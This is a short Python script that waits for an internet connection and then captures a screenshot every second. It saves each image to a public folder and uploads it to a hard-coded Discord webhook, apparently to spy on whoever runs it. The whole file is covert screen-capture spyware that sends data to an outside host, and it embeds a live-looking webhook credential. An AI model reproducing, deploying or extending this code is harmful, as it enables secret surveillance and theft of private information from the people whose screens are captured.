import pyautogui

from discord import SyncWebhook, File
import time
import requests
wifi = True
wfi = 0

while True:
    try:
        requests.get('https://www.google.com/').status_code
        break
    except:
        time.sleep(5)
        pass
    wifi = False
    wfi = 1
while True:
    if wifi == True:

        time.sleep(1)
        screenshot = pyautogui.screenshot()

        screenshot.save('C:/Users/Public/Documents/screenshot.png')

        

        wh = SyncWebhook.from_url("https://discord.com/api/webhooks/1183761571013468260/rcmU31SCM7AtmBd8NV3OXQSyXYelCQwCKuSQdW6iE0XQ_p-OXBM_4VtB1XEgFTOCbEjI")
        wh.send(file=File('C:/Users/Public/Documents/screenshot.png'))
    else:
        print("")
